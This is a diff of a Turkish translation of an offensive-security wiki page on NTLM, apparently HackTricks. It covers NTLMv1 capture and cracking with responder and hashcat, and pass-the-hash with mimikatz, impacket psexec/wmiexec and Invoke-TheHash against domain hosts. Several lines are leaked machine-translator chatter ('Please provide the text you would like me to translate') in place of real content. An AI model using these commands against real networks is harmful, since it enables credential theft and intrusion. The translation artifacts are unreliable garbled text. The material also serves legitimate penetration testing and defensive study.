@@ -46,20 +46,20 @@ Olası değerler:
 ```
 ## Temel NTLM Alan Kimlik Doğrulama Şeması
 
-1. **Kullanıcı** **kimlik bilgilerini** tanıtır
-2. İstemci makine **alan adı** ve **kullanıcı adı** göndererek **kimlik doğrulama isteği** gönderir
-3. **Sunucu** **meydan okuma** gönderir
-4. **İstemci**, **şifreyi** anahtar olarak kullanarak **meydan okumayı** şifreler ve yanıt olarak gönderir
+1. **Kullanıcı** **kimlik bilgilerini** girer.
+2. İstemci makine **alan adı** ve **kullanıcı adı** göndererek **kimlik doğrulama isteği** gönderir.
+3. **Sunucu** **meydan okuma** gönderir.
+4. **İstemci**, **şifreyi** anahtar olarak kullanarak **meydan okumayı** **şifreler** ve yanıt olarak gönderir.
 5. **Sunucu**, **Alan denetleyicisine** **alan adı, kullanıcı adı, meydan okuma ve yanıt** gönderir. Eğer **yapılandırılmış bir Active Directory yoksa** veya alan adı sunucunun adıysa, kimlik bilgileri **yerel olarak kontrol edilir**.
-6. **Alan denetleyicisi her şeyin doğru olup olmadığını kontrol eder** ve bilgileri sunucuya gönderir
+6. **Alan denetleyicisi her şeyin doğru olup olmadığını kontrol eder** ve bilgileri sunucuya gönderir.
 
 **Sunucu** ve **Alan Denetleyicisi**, **Netlogon** sunucusu aracılığıyla **Güvenli Kanal** oluşturabilir çünkü Alan Denetleyicisi sunucunun şifresini bilmektedir (bu **NTDS.DIT** veritabanının içindedir).
 
 ### Yerel NTLM Kimlik Doğrulama Şeması
 
-Kimlik doğrulama, **önceki** ile aynıdır ancak **sunucu**, **SAM** dosyası içinde kimlik doğrulama yapmaya çalışan **kullanıcının hash'ini** bilmektedir. Bu nedenle, Alan Denetleyicisi'nden istemek yerine, **sunucu kendisi** kullanıcının kimlik doğrulayıp doğrulamayacağını kontrol edecektir.
+Kimlik doğrulama, **önceki** ile aynıdır ancak **sunucu**, **SAM** dosyası içinde kimlik doğrulama yapmaya çalışan **kullanıcının hash'ini** bilmektedir. Bu nedenle, Alan Denetleyicisi'nden istemek yerine, **sunucu kendisi** kullanıcının kimlik doğrulayıp doğrulayamayacağını kontrol eder.
 
-### NTLMv1 Meydan Okuması
+### NTLMv1 Meydan Okuma
 
 **Meydan okuma uzunluğu 8 bayttır** ve **yanıt 24 bayt** uzunluğundadır.
 
@@ -79,9 +79,9 @@ Günümüzde, yapılandırılmış Kısıtlanmamış Delegasyon ile ortam bulmak
 
 AD'de zaten sahip olduğunuz bazı kimlik bilgilerini/oturumları **yazıcının bazı** **kontrolünüz altındaki** **sunucuya kimlik doğrulaması yapmasını istemek** için istismar edebilirsiniz. Ardından, `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **kimlik doğrulama meydan okumasını 1122334455667788** olarak ayarlayabilir, kimlik doğrulama girişimini yakalayabilir ve eğer **NTLMv1** kullanılarak yapılmışsa, **kırabilirsiniz**.\
 Eğer `responder` kullanıyorsanız, **kimlik doğrulamayı** **düşürmek** için `--lm` bayrağını **kullanmayı** deneyebilirsiniz.\
-&#xNAN;_&#x4E;ote that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._
+&#xNAN;_&#x4E;Bu teknik için kimlik doğrulamanın NTLMv1 kullanılarak gerçekleştirilmesi gerektiğini unutmayın (NTLMv2 geçerli değildir)._
 
-Yazıcının kimlik doğrulama sırasında bilgisayar hesabını kullanacağını ve bilgisayar hesaplarının **uzun ve rastgele şifreler** kullandığını unutmayın; bu nedenle, muhtemelen yaygın **sözlükler** kullanarak **kıramayacaksınız**. Ancak **NTLMv1** kimlik doğrulaması **DES** kullanır ([daha fazla bilgi burada](./#ntlmv1-challenge)), bu nedenle DES'i kırmaya özel olarak adanmış bazı hizmetleri kullanarak bunu kırabileceksiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) kullanabilirsiniz).
+Yazıcının kimlik doğrulama sırasında bilgisayar hesabını kullanacağını ve bilgisayar hesaplarının **uzun ve rastgele şifreler** kullandığını unutmayın; bu nedenle, muhtemelen yaygın **sözlükler** kullanarak **kırmanız** mümkün olmayacaktır. Ancak **NTLMv1** kimlik doğrulaması **DES** kullanır ([daha fazla bilgi burada](./#ntlmv1-challenge)), bu nedenle DES'i kırmaya özel olarak adanmış bazı hizmetleri kullanarak bunu kırabileceksiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) kullanabilirsiniz).
 
 ### Hashcat ile NTLMv1 Saldırısı
 
@@ -91,7 +91,7 @@ Komut
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-Lütfen çevirmemi istediğiniz metni paylaşın.
+Please provide the text you would like me to translate.
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -126,7 +126,7 @@ Hashcat'i çalıştırın (dağıtılmış olanı hashtopolis gibi bir araçla y
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-Bu durumda, bunun şifresinin "password" olduğunu biliyoruz, bu yüzden demo amaçları için hile yapacağız:
+Bu durumda, bunun şifresinin "password" olduğunu biliyoruz, bu yüzden gösterim amaçları için hile yapacağız:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -143,7 +143,7 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-I'm sorry, but I need the specific text you want translated in order to assist you. Please provide the relevant English text.
+Lütfen çevirmemi istediğiniz metni paylaşın.
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
@@ -157,11 +157,11 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 
 **Meydan okuma uzunluğu 8 bayttır** ve **2 yanıt gönderilir**: Biri **24 bayt** uzunluğundadır ve **diğerinin** uzunluğu **değişkendir**.
 
-**İlk yanıt**, **HMAC_MD5** kullanarak **istemci ve alan** tarafından oluşturulan **diziyi** şifreleyerek oluşturulur ve **anahtar** olarak **NT hash**'in **MD4** hash'i kullanılır. Ardından, **sonuç**, **meydan okumayı** şifrelemek için **HMAC_MD5** kullanarak **anahtar** olarak kullanılacaktır. Buna, **8 baytlık bir istemci meydan okuması eklenecektir**. Toplam: 24 B.
+**İlk yanıt**, **HMAC_MD5** kullanarak **istemci ve alan** tarafından oluşturulan **diziyi** şifreleyerek oluşturulur ve **anahtar** olarak **NT hash**'in **MD4** hash'i kullanılır. Ardından, **sonuç**, **meydan okumayı** şifrelemek için **HMAC_MD5** kullanarak **anahtar** olarak kullanılacaktır. Bunun için **8 baytlık bir istemci meydan okuması eklenecektir**. Toplam: 24 B.
 
 **İkinci yanıt**, **birkaç değer** (yeni bir istemci meydan okuması, **tekrar saldırılarını** önlemek için bir **zaman damgası**...) kullanılarak oluşturulur.
 
-Eğer başarılı bir kimlik doğrulama sürecini yakalamış bir **pcap**'iniz varsa, alan, kullanıcı adı, meydan okuma ve yanıt almak için bu kılavuzu takip edebilir ve şifreyi kırmayı deneyebilirsiniz: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
+Eğer **başarılı bir kimlik doğrulama sürecini yakalamış bir pcap dosyanız varsa**, alan, kullanıcı adı, meydan okuma ve yanıt almak için bu kılavuzu takip edebilir ve şifreyi kırmayı deneyebilirsiniz: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
@@ -176,7 +176,7 @@ O **hash** ile **NTLM kimlik doğrulaması gerçekleştirecek** bir **araç** ku
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Bu, mimikatz'ı başlatan kullanıcıların ait olduğu bir süreci başlatacaktır, ancak LSASS içinde kaydedilen kimlik bilgileri mimikatz parametrelerindeki kimlik bilgileridir. Ardından, o kullanıcıymış gibi ağ kaynaklarına erişebilirsiniz (şifreyi düz metin olarak bilmenize gerek olmayan `runas /netonly` numarasına benzer).
+Bu, mimikatz'ı başlatan kullanıcıların ait olduğu bir süreci başlatacaktır, ancak LSASS içinde kaydedilen kimlik bilgileri mimikatz parametrelerindeki kimlik bilgileridir. Ardından, o kullanıcıymış gibi ağ kaynaklarına erişebilirsiniz (bu, `runas /netonly` numarasına benzer, ancak düz metin şifresini bilmenize gerek yoktur).
 
 ### Linux'tan Pass-the-Hash
 
@@ -185,7 +185,7 @@ Linux'tan Pass-the-Hash kullanarak Windows makinelerinde kod yürütme elde edeb
 
 ### Impacket Windows derlenmiş araçları
 
-[Windows için impacket ikili dosyalarını buradan indirebilirsiniz.](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)
+[Windows için impacket ikili dosyalarını buradan indirebilirsiniz](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
@@ -214,7 +214,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-Bu fonksiyon **diğerlerinin hepsinin karışımıdır**. **Birden fazla host** geçirebilir, bazılarını **hariç tutabilir** ve kullanmak istediğiniz **seçeneği** **seçebilirsiniz** (_SMBExec, WMIExec, SMBClient, SMBEnum_). **SMBExec** ve **WMIExec**'den **herhangi birini** seçerseniz ancak _**Command**_ parametresi vermezseniz, sadece **yeterli izinlere** sahip olup olmadığınızı **kontrol eder**.
+Bu fonksiyon **diğerlerinin hepsinin karışımıdır**. **Birden fazla host** geçirebilir, bazılarını **hariç tutabilir** ve kullanmak istediğiniz **seçeneği** (_SMBExec, WMIExec, SMBClient, SMBEnum_) **seçebilirsiniz**. **SMBExec** ve **WMIExec**'den **herhangi birini** seçerseniz ancak _**Command**_ parametresi vermezseniz, sadece **yeterli izinlere** sahip olup olmadığınızı **kontrol eder**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -236,7 +236,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ## Bir Windows Anahtarından Kimlik Bilgilerini Çıkarma
 
-**Bir Windows anahtarından kimlik bilgilerini nasıl elde edeceğiniz hakkında daha fazla bilgi için bu sayfayı okumalısınız.**
+**Daha fazla bilgi için** [**Windows anahtarından kimlik bilgilerini nasıl elde edeceğinizi bu sayfadan okuyabilirsiniz**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
 
 ## NTLM İletimi ve Yanıtlayıcı
 
